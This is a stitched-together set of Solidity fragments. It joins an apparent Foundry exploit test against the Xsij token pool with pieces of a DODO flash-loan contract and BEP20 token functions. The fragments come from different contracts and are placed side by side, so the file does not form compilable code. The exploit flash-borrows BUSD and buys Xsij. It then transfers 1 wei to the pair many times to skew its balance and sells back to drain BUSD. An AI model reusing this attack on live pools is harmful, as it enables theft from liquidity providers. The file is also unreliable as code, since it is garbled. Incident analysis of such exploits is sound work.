function testExploit() public {
    emit log_named_decimal_uint(
        "Attacker USDT balance before exploit", BUSD.balanceOf(address(this)), BUSD.decimals()
    );
    DPP.flashLoan(0, 100_000_000_000_000_000_000_000, address(this), new bytes(0x123));
    emit log_named_decimal_uint(
        "Attacker USDT balance after exploit", BUSD.balanceOf(address(this)), BUSD.decimals()
    );
}

function balanceOf(address account) external view returns (uint256) {
  return _balances[account];
}

function decimals() external view returns (uint8) {
  return _decimals;
}

function flashLoan(
    uint256 baseAmount,
    uint256 quoteAmount,
    address assetTo,
    bytes calldata data
) external preventReentrant {
    _transferBaseOut(assetTo, baseAmount);
    _transferQuoteOut(assetTo, quoteAmount);

    if (data.length > 0)
        IDODOCallee(assetTo).DPPFlashLoanCall(msg.sender, baseAmount, quoteAmount, data);

    uint256 baseBalance = _BASE_TOKEN_.balanceOf(address(this));
    uint256 quoteBalance = _QUOTE_TOKEN_.balanceOf(address(this));

    // no input -> pure loss
    require(
        baseBalance >= _BASE_RESERVE_ || quoteBalance >= _QUOTE_RESERVE_,
        "FLASH_LOAN_FAILED"
    );

    // sell quote case
    // quote input + base output
    if (baseBalance < _BASE_RESERVE_) {
        uint256 quoteInput = quoteBalance.sub(uint256(_QUOTE_RESERVE_));
        (
            uint256 receiveBaseAmount,
            uint256 mtFee,
            PMMPricing.RState newRState,
            uint256 newQuoteTarget
        ) = querySellQuote(tx.origin, quoteInput); // revert if quoteBalance<quoteReserve
        require(uint256(_BASE_RESERVE_).sub(baseBalance) <= receiveBaseAmount, "FLASH_LOAN_FAILED");

        _transferBaseOut(_MAINTAINER_, mtFee);
        if (_RState_ != uint32(newRState)) {
            require(newQuoteTarget <= uint112(-1),"OVERFLOW");
            _QUOTE_TARGET_ = uint112(newQuoteTarget);
            _RState_ = uint32(newRState);
            emit RChange(newRState);
        }
        emit DODOSwap(
            address(_QUOTE_TOKEN_),
            address(_BASE_TOKEN_),
            quoteInput,
            receiveBaseAmount,
            msg.sender,
            assetTo
        );
    }

    // sell base case
    // base input + quote output
    if (quoteBalance < _QUOTE_RESERVE_) {
        uint256 baseInput = baseBalance.sub(uint256(_BASE_RESERVE_));
        (
            uint256 receiveQuoteAmount,
            uint256 mtFee,
            PMMPricing.RState newRState,
            uint256 newBaseTarget
        ) = querySellBase(tx.origin, baseInput); // revert if baseBalance<baseReserve
        require(uint256(_QUOTE_RESERVE_).sub(quoteBalance) <= receiveQuoteAmount, "FLASH_LOAN_FAILED");

        _transferQuoteOut(_MAINTAINER_, mtFee);
        if (_RState_ != uint32(newRState)) {
            require(newBaseTarget <= uint112(-1),"OVERFLOW");
            _BASE_TARGET_ = uint112(newBaseTarget);
            _RState_ = uint32(newRState);
            emit RChange(newRState);
        }
        emit DODOSwap(
            address(_BASE_TOKEN_),
            address(_QUOTE_TOKEN_),
            baseInput,
            receiveQuoteAmount,
            msg.sender,
            assetTo
        );
    }

    _sync();

    emit DODOFlashLoan(msg.sender, assetTo, baseAmount, quoteAmount);
}

// ============ Query Functions ============

function transfer(address recipient, uint256 amount) external returns (bool) {
  _transfer(_msgSender(), recipient, amount);
  return true;
}

function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
    BUSD.approve(address(Router), 100_000 * 1e18);
    address[] memory path = new address[](2);
    path[0] = address(BUSD);
    path[1] = address(Xsij);

    Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
        100_000 * 1e18, 0, path, address(this), block.timestamp + 100
    );
    uint256 i;
    while (Xsij.balanceOf(address(Pair)) > 1800 * 1e18) {
        Xsij.transfer(address(Pair), 1);
        i++;
    }
    Xsij.approve(address(Router), 10_111_100_000 * 1e18);
    address[] memory path2 = new address[](2);
    path2[0] = address(Xsij);
    path2[1] = address(BUSD);
    Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
        Xsij.balanceOf(address(this)), 0, path2, address(this), block.timestamp + 100
    );
    BUSD.transfer(address(msg.sender), quoteAmount);
}

function approve(address spender, uint256 amount) external returns (bool) {
  _approve(_msgSender(), spender, amount);
  return true;
}

function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
  _transfer(sender, recipient, amount);
  _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "BEP20: transfer amount exceeds allowance"));
  return true;
}

function totalSupply() external view returns (uint256) {
  return _totalSupply;
}
